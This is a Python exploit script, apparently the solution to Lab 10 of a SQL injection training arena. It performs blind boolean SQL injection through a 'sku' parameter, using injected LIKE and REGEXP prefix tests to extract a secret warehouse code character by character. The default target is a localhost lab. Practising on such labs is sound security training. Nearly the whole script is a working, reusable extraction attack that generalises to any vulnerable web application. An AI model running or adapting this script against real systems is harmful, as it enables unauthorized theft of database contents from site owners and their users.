#!/usr/bin/env python3
"""
Lab 10 -- Blind Boolean SQLi: LIKE / REGEXP Prefix Extraction
=============================================================
Extracts the warehouse code from 'warehouse_codes' using LIKE
prefix matching as a boolean oracle.

Usage:
    python3 lab10_blind_like.py [TARGET_URL]

Default target: http://localhost/SQLi-Arena/public/lab.php
"""
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost/SQLi-Arena/public/lab.php"
PARAMS_BASE = {"lab": "mysql/lab10", "mode": "black"}

TRUE_MARKER = "result-data"

# Characters likely to appear in the flag
CHARSET = "FLAGflag{}_abcdefghijklmnopqrstuvwxyz0123456789"


def check_like(prefix):
    """Test if the warehouse code starts with the given prefix using LIKE."""
    # Escape LIKE special characters (% and _)
    safe = prefix.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
    payload = f"SKU001' AND (SELECT code FROM warehouse_codes LIMIT 1) LIKE BINARY '{safe}%' -- -"
    params = {**PARAMS_BASE, "sku": payload}
    r = requests.get(TARGET, params=params)
    return TRUE_MARKER in r.text


def check_regexp(prefix):
    """Alternative: test with REGEXP instead of LIKE."""
    # Escape regex special characters
    import re
    safe = re.escape(prefix)
    payload = f"SKU001' AND (SELECT BINARY code FROM warehouse_codes LIMIT 1) REGEXP '^{safe}' -- -"
    params = {**PARAMS_BASE, "sku": payload}
    r = requests.get(TARGET, params=params)
    return TRUE_MARKER in r.text


# ── Step 1: Confirm the oracle ──
print(f"[*] Target: {TARGET}")
print("[*] Confirming boolean oracle...")
test_payload = "SKU001' AND 1=1 -- -"
params = {**PARAMS_BASE, "sku": test_payload}
r = requests.get(TARGET, params=params)
if TRUE_MARKER not in r.text:
    print("[-] ERROR: Oracle not working. Check TARGET URL.")
    sys.exit(1)
print("[+] Boolean oracle confirmed")

# ── Step 2: Extract via LIKE prefix matching ──
print("[*] Extracting flag via LIKE prefix matching...")
print(f"[*] Charset: {CHARSET}")
flag = ""
while True:
    found = False
    for c in CHARSET:
        if check_like(flag + c):
            flag += c
            print(f"  [{len(flag):2d}] {flag}")
            found = True
            break
    if not found:
        # Check if we have a complete flag (ends with })
        if flag.endswith("}"):
            break
        # Try remaining printable ASCII
        print("[*] Expanding charset to full printable ASCII...")
        for code in range(32, 127):
            c = chr(code)
            if c in CHARSET:
                continue
            if check_like(flag + c):
                flag += c
                print(f"  [{len(flag):2d}] {flag}")
                found = True
                break
        if not found:
            break

print(f"\n[+] Flag: {flag}")
